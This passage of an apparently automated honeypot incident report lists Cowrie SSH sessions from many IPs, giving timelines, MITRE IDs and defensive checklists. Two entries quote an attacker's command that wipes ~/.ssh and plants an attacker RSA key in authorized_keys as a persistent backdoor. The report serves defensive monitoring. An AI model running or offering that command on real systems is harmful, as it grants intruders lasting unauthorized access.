| **First Seen** | 2026-08-11 03:44 |
| **Last Seen** | 2026-08-11 03:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:44:28` | `cowrie.session.connect` |
| `2026-08-11 03:44:29` | `cowrie.client.version` |
| `2026-08-11 03:44:29` | `cowrie.client.kex` |
| `2026-08-11 03:44:32` | `cowrie.login.success` |
| `2026-08-11 03:44:33` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc02e6913158

| Field | Detail |
|---|---|
| **Source IP** | `218.206.136[.]24` |
| **First Seen** | 2026-08-11 03:49 |
| **Last Seen** | 2026-08-11 03:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:49:03` | `cowrie.session.connect` |
| `2026-08-11 03:49:04` | `cowrie.client.version` |
| `2026-08-11 03:49:04` | `cowrie.client.kex` |
| `2026-08-11 03:49:06` | `cowrie.login.success` |
| `2026-08-11 03:49:07` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.206.136[.]24` to AbuseIPDB if not already reported
- [ ] Block `218.206.136[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d6c4c9b989f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.187[.]47` |
| **First Seen** | 2026-08-11 03:49 |
| **Last Seen** | 2026-08-11 03:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:49:12` | `cowrie.session.connect` |
| `2026-08-11 03:49:13` | `cowrie.client.version` |
| `2026-08-11 03:49:13` | `cowrie.client.kex` |
| `2026-08-11 03:49:14` | `cowrie.login.success` |
| `2026-08-11 03:49:14` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.187[.]47` to AbuseIPDB if not already reported
- [ ] Block `65.20.187[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9bb36fdb81e

| Field | Detail |
|---|---|
| **Source IP** | `177.174.89[.]99` |
| **First Seen** | 2026-08-11 03:59 |
| **Last Seen** | 2026-08-11 03:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 03:59:37` | `cowrie.session.connect` |
| `2026-08-11 03:59:37` | `cowrie.client.version` |
| `2026-08-11 03:59:37` | `cowrie.client.kex` |
| `2026-08-11 03:59:39` | `cowrie.login.success` |
| `2026-08-11 03:59:40` | `cowrie.direct-tcpip.request` |
| `2026-08-11 03:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.89[.]99` to AbuseIPDB if not already reported
- [ ] Block `177.174.89[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b00f9077234

| Field | Detail |
|---|---|
| **Source IP** | `71.229.1[.]186` |
| **First Seen** | 2026-08-11 04:02 |
| **Last Seen** | 2026-08-11 04:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:02:16` | `cowrie.session.connect` |
| `2026-08-11 04:02:17` | `cowrie.client.version` |
| `2026-08-11 04:02:17` | `cowrie.client.kex` |
| `2026-08-11 04:02:18` | `cowrie.login.success` |
| `2026-08-11 04:02:18` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.229.1[.]186` to AbuseIPDB if not already reported
- [ ] Block `71.229.1[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b8cf71ed86

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-08-11 04:02 |
| **Last Seen** | 2026-08-11 04:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:02:23` | `cowrie.session.connect` |
| `2026-08-11 04:02:24` | `cowrie.client.version` |
| `2026-08-11 04:02:24` | `cowrie.client.kex` |
| `2026-08-11 04:02:26` | `cowrie.login.success` |
| `2026-08-11 04:02:26` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e67cf6d8a0f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 04:02 |
| **Last Seen** | 2026-08-11 04:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:02:54` | `cowrie.session.connect` |
| `2026-08-11 04:02:54` | `cowrie.client.version` |
| `2026-08-11 04:02:55` | `cowrie.client.kex` |
| `2026-08-11 04:02:55` | `cowrie.login.success` |
| `2026-08-11 04:02:55` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:02:55` | `cowrie.direct-tcpip.data` |
| `2026-08-11 04:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-429d2a2386db

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-11 04:06 |
| **Last Seen** | 2026-08-11 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:06:46` | `cowrie.session.connect` |
| `2026-08-11 04:06:46` | `cowrie.client.version` |
| `2026-08-11 04:06:46` | `cowrie.client.kex` |
| `2026-08-11 04:06:47` | `cowrie.login.success` |
| `2026-08-11 04:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baa1297b8a84

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-11 04:06 |
| **Last Seen** | 2026-08-11 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:06:46` | `cowrie.session.connect` |
| `2026-08-11 04:06:46` | `cowrie.client.version` |
| `2026-08-11 04:06:46` | `cowrie.client.kex` |
| `2026-08-11 04:06:47` | `cowrie.login.success` |
| `2026-08-11 04:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a69b97cee4

| Field | Detail |
|---|---|
| **Source IP** | `210.13.99[.]66` |
| **First Seen** | 2026-08-11 04:23 |
| **Last Seen** | 2026-08-11 04:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:23:18` | `cowrie.session.connect` |
| `2026-08-11 04:23:19` | `cowrie.client.version` |
| `2026-08-11 04:23:19` | `cowrie.client.kex` |
| `2026-08-11 04:23:21` | `cowrie.login.success` |
| `2026-08-11 04:23:21` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:23:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.13.99[.]66` to AbuseIPDB if not already reported
- [ ] Block `210.13.99[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3791858ce351

| Field | Detail |
|---|---|
| **Source IP** | `183.88.232[.]183` |
| **First Seen** | 2026-08-11 04:27 |
| **Last Seen** | 2026-08-11 04:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:27:59` | `cowrie.session.connect` |
| `2026-08-11 04:27:59` | `cowrie.client.version` |
| `2026-08-11 04:28:00` | `cowrie.client.kex` |
| `2026-08-11 04:28:01` | `cowrie.login.success` |
| `2026-08-11 04:28:02` | `cowrie.session.params` |
| `2026-08-11 04:28:02` | `cowrie.command.input` |
| `2026-08-11 04:28:02` | `cowrie.command.failed` |
| `2026-08-11 04:28:03` | `cowrie.log.closed` |
| `2026-08-11 04:28:03` | `cowrie.session.params` |
| `2026-08-11 04:28:03` | `cowrie.command.input` |
| `2026-08-11 04:28:04` | `cowrie.session.file_download` |
| `2026-08-11 04:28:04` | `cowrie.log.closed` |
| `2026-08-11 04:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.88.232[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.88.232[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23557dc4cb9

| Field | Detail |
|---|---|
| **Source IP** | `183.88.232[.]183` |
| **First Seen** | 2026-08-11 04:28 |
| **Last Seen** | 2026-08-11 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:28:04` | `cowrie.session.connect` |
| `2026-08-11 04:28:04` | `cowrie.client.version` |
| `2026-08-11 04:28:04` | `cowrie.client.kex` |
| `2026-08-11 04:28:05` | `cowrie.login.success` |
| `2026-08-11 04:28:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.88.232[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.88.232[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-816fa8f5d508

| Field | Detail |
|---|---|
| **Source IP** | `183.88.232[.]183` |
| **First Seen** | 2026-08-11 04:28 |
| **Last Seen** | 2026-08-11 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:28:06` | `cowrie.session.connect` |
| `2026-08-11 04:28:06` | `cowrie.client.version` |
| `2026-08-11 04:28:06` | `cowrie.client.kex` |
| `2026-08-11 04:28:07` | `cowrie.login.success` |
| `2026-08-11 04:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.88.232[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.88.232[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-366c62080453

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-08-11 04:28 |
| **Last Seen** | 2026-08-11 04:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:28:33` | `cowrie.session.connect` |
| `2026-08-11 04:28:33` | `cowrie.client.version` |
| `2026-08-11 04:28:33` | `cowrie.client.kex` |
| `2026-08-11 04:28:35` | `cowrie.login.success` |
| `2026-08-11 04:28:36` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae991ec30e60

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]75` |
| **First Seen** | 2026-08-11 04:32 |
| **Last Seen** | 2026-08-11 04:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:32:20` | `cowrie.session.connect` |
| `2026-08-11 04:32:20` | `cowrie.client.version` |
| `2026-08-11 04:32:20` | `cowrie.client.kex` |
| `2026-08-11 04:32:21` | `cowrie.login.success` |
| `2026-08-11 04:32:22` | `cowrie.session.params` |
| `2026-08-11 04:32:22` | `cowrie.command.input` |
| `2026-08-11 04:32:22` | `cowrie.command.failed` |
| `2026-08-11 04:32:22` | `cowrie.log.closed` |
| `2026-08-11 04:32:23` | `cowrie.session.params` |
| `2026-08-11 04:32:23` | `cowrie.command.input` |
| `2026-08-11 04:32:23` | `cowrie.session.file_download` |
| `2026-08-11 04:32:23` | `cowrie.log.closed` |
| `2026-08-11 04:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]75` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f699e8d8b1

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]75` |
| **First Seen** | 2026-08-11 04:32 |
| **Last Seen** | 2026-08-11 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:32:23` | `cowrie.session.connect` |
| `2026-08-11 04:32:23` | `cowrie.client.version` |
| `2026-08-11 04:32:24` | `cowrie.client.kex` |
| `2026-08-11 04:32:25` | `cowrie.login.success` |
| `2026-08-11 04:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]75` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e847285dfe28

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]75` |
| **First Seen** | 2026-08-11 04:32 |
| **Last Seen** | 2026-08-11 04:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:32:25` | `cowrie.session.connect` |
| `2026-08-11 04:32:25` | `cowrie.client.version` |
| `2026-08-11 04:32:25` | `cowrie.client.kex` |
| `2026-08-11 04:32:26` | `cowrie.login.success` |
| `2026-08-11 04:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]75` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1349571bca2

| Field | Detail |
|---|---|
| **Source IP** | `218.23.95[.]14` |
| **First Seen** | 2026-08-11 04:33 |
| **Last Seen** | 2026-08-11 04:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:33:36` | `cowrie.session.connect` |
| `2026-08-11 04:33:37` | `cowrie.client.version` |
| `2026-08-11 04:33:37` | `cowrie.client.kex` |
| `2026-08-11 04:33:40` | `cowrie.login.success` |
| `2026-08-11 04:33:40` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.23.95[.]14` to AbuseIPDB if not already reported
- [ ] Block `218.23.95[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad95fe0f02af

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-08-11 04:33 |
| **Last Seen** | 2026-08-11 04:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:33:47` | `cowrie.session.connect` |
| `2026-08-11 04:33:47` | `cowrie.client.version` |
| `2026-08-11 04:33:47` | `cowrie.client.kex` |
| `2026-08-11 04:33:49` | `cowrie.login.success` |
| `2026-08-11 04:33:50` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd5e47d3b89

| Field | Detail |
|---|---|
| **Source IP** | `217.24.185[.]98` |
| **First Seen** | 2026-08-11 04:36 |
| **Last Seen** | 2026-08-11 04:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:36:35` | `cowrie.session.connect` |
| `2026-08-11 04:36:36` | `cowrie.client.version` |
| `2026-08-11 04:36:36` | `cowrie.client.kex` |
| `2026-08-11 04:36:37` | `cowrie.login.success` |
| `2026-08-11 04:36:37` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.24.185[.]98` to AbuseIPDB if not already reported
- [ ] Block `217.24.185[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da319784e95a

| Field | Detail |
|---|---|
| **Source IP** | `65.20.237[.]119` |
| **First Seen** | 2026-08-11 04:52 |
| **Last Seen** | 2026-08-11 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:52:56` | `cowrie.session.connect` |
| `2026-08-11 04:52:57` | `cowrie.client.version` |
| `2026-08-11 04:52:57` | `cowrie.client.kex` |
| `2026-08-11 04:52:58` | `cowrie.login.success` |
| `2026-08-11 04:52:58` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.237[.]119` to AbuseIPDB if not already reported
- [ ] Block `65.20.237[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb7b9041328

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-08-11 04:53 |
| **Last Seen** | 2026-08-11 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:53:08` | `cowrie.session.connect` |
| `2026-08-11 04:53:08` | `cowrie.client.version` |
| `2026-08-11 04:53:08` | `cowrie.client.kex` |
| `2026-08-11 04:53:09` | `cowrie.login.success` |
| `2026-08-11 04:53:10` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e52e8d056a6

| Field | Detail |
|---|---|
| **Source IP** | `77.106.78[.]215` |
| **First Seen** | 2026-08-11 04:57 |
| **Last Seen** | 2026-08-11 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 04:57:25` | `cowrie.session.connect` |
| `2026-08-11 04:57:26` | `cowrie.client.version` |
| `2026-08-11 04:57:26` | `cowrie.client.kex` |
| `2026-08-11 04:57:27` | `cowrie.login.success` |
| `2026-08-11 04:57:28` | `cowrie.direct-tcpip.request` |
| `2026-08-11 04:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.106.78[.]215` to AbuseIPDB if not already reported
- [ ] Block `77.106.78[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15647ed2f98a

| Field | Detail |
|---|---|
| **Source IP** | `111.70.10[.]15` |
| **First Seen** | 2026-08-11 05:02 |
| **Last Seen** | 2026-08-11 05:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:02:33` | `cowrie.session.connect` |
| `2026-08-11 05:02:34` | `cowrie.client.version` |
| `2026-08-11 05:02:34` | `cowrie.client.kex` |
| `2026-08-11 05:02:36` | `cowrie.login.success` |
| `2026-08-11 05:02:37` | `cowrie.direct-tcpip.request` |
| `2026-08-11 05:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.10[.]15` to AbuseIPDB if not already reported
- [ ] Block `111.70.10[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05480aebf079

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]135` |
| **First Seen** | 2026-08-11 05:02 |
| **Last Seen** | 2026-08-11 05:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:02:43` | `cowrie.session.connect` |
| `2026-08-11 05:02:43` | `cowrie.client.version` |
